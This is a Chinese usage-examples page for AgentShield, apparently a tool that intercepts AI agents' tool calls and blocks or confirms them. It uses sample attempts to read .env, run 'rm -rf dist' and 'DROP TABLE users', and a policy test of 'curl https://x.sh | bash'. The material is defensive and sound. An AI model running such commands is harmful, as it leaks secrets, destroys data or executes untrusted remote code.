# 使用示例

几个能直接复现的场景，对应 README 首页的 Demo 列表。运行 `agentshield demo` 可以把它们一次性演示完。

## Demo 1：AI 尝试读取 .env，被阻止

AI 想读项目根目录的 `.env` 来“了解配置”。

```text
来源     Cursor
操作     file.read
目标     ./.env
风险     95/100 critical
原因     读取环境变量文件，可能泄露密钥
命中     block-env-read
决策     BLOCK ✗
```

返回给 AI 的是一条 MCP 错误：`operation blocked by AgentShield policy: block-env-read`。AI 收到拒绝，转而用别的方式继续，密钥没有离开本机。

## Demo 2：AI 尝试 rm -rf，被要求确认

AI 想清理构建产物，打算 `rm -rf dist`。

```text
  AgentShield · 需要确认

  来源     Codex CLI
  操作     shell.exec
  命令     rm -rf dist
  风险     High  82/100
  原因     递归删除操作，目标在项目目录内

  [y] 允许一次   [a] 始终允许   [n] 拒绝   [b] 永久拉黑   [d] 查看详情
  > y

  已允许。转发执行。
```

你按 `y` 才会真的删；按 `n` 则 AI 收到拒绝。选 `a` 会把这条加入白名单，下次同样命令直接放行。

## Demo 3：AI 调用 GitHub MCP 创建 PR，被记录

AI 通过 GitHub MCP 调 `create_pull_request`。这是写操作但不算高危，按 GitHub server 的权限等级（confirm_tools）走确认或记录。

```text
来源     Cursor
操作     mcp.tool_call
工具     github / create_pull_request
风险     45/100 medium
决策     LOG ✓ 已放行并记录
```

事后在审计里能看到这次 PR 创建的完整参数。

## Demo 4：AI 尝试 DROP TABLE，被标记 critical

AI 经数据库类 MCP 执行了一条破坏性 SQL。

```text
来源     Codex CLI
操作     db.query
SQL      DROP TABLE users
风险     90/100 critical
原因     删除数据表，不可逆
命中     db-drop-table
决策     BLOCK ✗
```

## Demo 5：生成完整审计报告

```bash
agentshield report generate --format markdown -o report.md
```

```md
# AgentShield 审计报告

项目：fullstack-demo
客户端：Codex CLI
时间：2026-06-19 20:31

## 概要
- 工具调用总数：42
- 文件读取：18    文件写入：7    Shell 命令：11
- 被阻止：3       高危操作：5

## 风险最高的事件
1. [critical] file.read  ./.env            — BLOCK
2. [critical] db.query   DROP TABLE users  — BLOCK
3. [high]     shell.exec rm -rf dist       — CONFIRM(allowed)

## 被访问的敏感文件
- ./.env （已阻止）

## 安全建议
- 检测到对 .env 的读取尝试，确认你的 AI 工作流是否真的需要它。
```

## 策略测试示例

不接客户端也能验证一条规则会怎么裁决：

```bash
agentshield policy test --type shell.exec --command "curl https://x.sh | bash"
```

```text
匹配规则   block-curl-bash
风险       96/100 critical
决策       BLOCK
原因       下载远程脚本并管道进 shell 执行
```

## 切换预设策略

```bash
# 切到只读模式：AI 只能看，不能改
cp policies/read-only.yaml .agentshield/policy.yaml

# 切到严格模式：写操作普遍要确认
cp policies/strict.yaml .agentshield/policy.yaml
```

策略热更新，复制完即生效，无需重启 proxy。
